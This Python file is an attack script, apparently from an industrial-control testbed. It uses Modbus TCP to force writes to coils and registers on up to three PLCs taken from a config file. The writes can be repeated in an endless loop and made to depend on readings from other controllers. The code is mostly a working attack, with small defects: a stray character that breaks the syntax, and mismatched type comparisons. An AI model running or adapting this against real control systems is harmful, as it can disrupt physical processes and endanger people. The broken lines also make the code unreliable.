#!/usr/bin/env python3
import configparser
import threading
from pymodbus.client.sync import ModbusTcpClient

def attack(ctx):  

    def on_level_change_plc(value, address):

        # Read from config.ini
        config = configparser.ConfigParser()
        config.read('config.ini')

        pckt_number = config.get('params', 'packets_number')
        pckt_value = int(config.get('params', 'packets_value'))

        print(address)

        if(pckt_number == "loop"): 
            while(True):
                case = 0
                print('PLC level value', value)
                
                if checkTrigger(address):
                    # Trigger checked
                    # Call the function to evaluate conditions
                    all_conditions_true = evaluate_conditions(config)

                    # Perform an operation if all conditions are true
                    if all_conditions_true:
                        # Your operation code here
                        print("All conditions are true. Performing the operation.")
                        trigger_operation_plc(pckt_value, address)
                    else:
                        print("Waiting for triggers...")
                      
                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc(pckt_value, address)

        else:
            # Pckt number != loop
            ct = 0
            n = int(pckt_number)
            while(ct < n):
                print('PLC level value', value)
                
                if checkTrigger(address):
                    # Trigger checked
                    # Call the function to evaluate conditions
                    all_conditions_true = evaluate_conditions(config)

                    # Perform an operation if all conditions are true
                    if all_conditions_true:
                        # Your operation code here
                        print("All conditions are true. Performing the operation.")
                        trigger_operation_plc(pckt_value, address)
                    else:
                        print("Waiting for triggers...")
                      
                else:
                    # Trigger unchecked - only main conditions
                        trigger_operation_plc(pckt_value, address)
                ct = ct + 1



    def checkTrigger(address):
        config = configparser.ConfigParser()
        config.read('config.ini')

        if 'params' in config:
            for param_name in config['params']:
                if param_name.startswith('condition'):
                    return True
        return False

    
    
    
    def trigger_operation_plc(p_val, address):
        
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        plc_choice = ""
        if(address == config.get('plc', 'plc1')):
            plc_choice = config.get('params', 'plc1_choice')
            sett = "plc1"
        elif(address == config.get('plc', 'plc2')):
            plc_choice = config.get('params', 'plc2_choice')
            sett = "plc2"
        elif(address == config.get('plc', 'plc3')):
            plc_choice = config.get('params', 'plc3_choice')
            sett = "plc3"
                
        # Extracting choices coils/registers
        choices_list = [choice.strip() for choice in plc_choice.split(',')]
        
        ip, port = address.split(':')

        # Convert the port to an integer
        port = int(port)

        client = ModbusTcpClient(ip, port = port)S
        client.connect()
        
        for choice in choices_list:
            if choice.startswith('c'):
                client.write_coil(int(choice[-1]), p_val, unit=1)
                print(f"Writing on %QX0.{int(choice[-1])} - {sett}")
            elif choice.startswith('m'):
                client.write_register(int(choice[-1])+1024, p_val, unit=1)
                print(f"Writing on %MW0.{int(choice[-1])} - {sett}")
                
        client.close()
               
        
        if p_val == 0:
            print('COMMAND OFF - Value wrote:', p_val)
        elif p_val == 1:
            print('COMMAND ON - Value wrote:', p_val)
    

    
    def evaluate_conditions(config):
        all_conditions_true = True
        for section_name in config.sections():
            for param_name, param_value in config[section_name].items():
                if param_name.startswith('condition'):
                    # Split the condition value into components
                    combined_ip, device, cond, value = param_value.split()

                    # Split the combined string into IP and port
                    ip, port = combined_ip.split(':')

                    # Convert the port to an integer
                    port = int(port)

                    # Determine the device type and number
                    device_type = device[0]
                    device_number = int(device[1:])

                    client = ModbusTcpClient(ip, port)
                    # Connect to the PLC
                    client.connect()

                    if device_type == 'c':
                        result = client.read_coils(device_number, 1, unit=1)
                        coil_value = bool(result.bits[0])  # Convert to boolean
                        print(f"Value of coil {device_number}: {coil_value}")

                        if coil_value == True:
                            coil_value = "ON"
                            value.upper()
                        else:
                            coil_value = "OFF"
                            value.upper()

                        if(cond == ">" or cond == "<"):
                            print("Condition error.")
                        elif(cond == "is"):
                            if(coil_value != value):
                                return False
                        elif(cond == "isnt"):
                            if(coil_value == value):
                                return False

                    elif device_type == "i":
                        result = client.read_input_registers(device_number, 1, unit=1)
                        if not result.isError() and len(result.registers) == 1:
                            input_register_value = int(result.registers[0])
                            print(f"Value of input register {device_number}: {input_register_value}")
                        else:
                            print(f"Error reading input register {device_number}")

                        value = int(value)

                        if(cond == ">"):
                            if(input_register_value <= value):
                                return False
                        elif(cond == "<"):
                            if(input_register_value >= value):
                                return False
                        else:
                            print("Condition error.")
                            

                    elif device_type == "m":
                        result = client.read_holding_registers(device_number+1024, 1, unit=1)
                        if not result.isError() and len(result.registers) == 1:
                            holding_register_value = int(result.registers[0])
                            print(f"Value of holding register {device_number}: {holding_register_value}")
                        else:
                            print(f"Error reading holding register {device_number}")

                        if(cond == ">"):
                            if(holding_register_value <= value):
                                return False
                        elif(cond == "<"):
                            if(holding_register_value >= value):
                                return False
                        else:
                            print("Condition error.")

                    else:
                        print(f"Unsupported device type: {device_type}")


                    client.close()

        return all_conditions_true
    
    
    # Read from config.ini
    config = configparser.ConfigParser()
    config.read('config.ini')

    plc_values = {}
    values = []

    for plc_key in config['plc']:
        plc_values[plc_key] = config.get('plc', plc_key)
        # Split the combined string into IP and port
        ip, port = plc_values[plc_key].split(':')

        # Convert the port to an integer
        port = int(port)

        client = ModbusTcpClient(ip, port = port)
        client.connect()
        result = client.read_input_registers(0, count=1, unit=1)
        values.append(result.registers[0])
        client.close()


    # PLC attack
    # ONE PLC selected
    if config.get('params', 'plc1_choice') != "" and (config.get('params', 'plc2_choice') == "" and config.get('params', 'plc3_choice') == ""):
        
        print("Attacking one plc...")
        on_level_change_plc(values[0], config.get('plc', 'plc1'))
        

    # TWO PLCs selected
    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') == "":
        print("Attacking two PLCs...")
        thread1 = threading.Thread(target=on_level_change_plc, args=(values[0], config.get('plc', 'plc1')))
        thread2 = threading.Thread(target=on_level_change_plc, args=(values[1], config.get('plc', 'plc2')))
        thread1.start()
        thread2.start()
        thread1.join()
        thread2.join()
    
    # THREE PLCs selected 
    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
        print("Attacking three plcs...")
        thread1 = threading.Thread(target=on_level_change_plc, args=(values[0], config.get('plc', 'plc1')))
        thread2 = threading.Thread(target=on_level_change_plc, args=(values[1], config.get('plc', 'plc2')))
        thread3 = threading.Thread(target=on_level_change_plc, args=(values[2], config.get('plc', 'plc3')))
        thread1.start()
        thread2.start()
        thread3.start()
        thread1.join()
        thread2.join()
        thread3.join()

    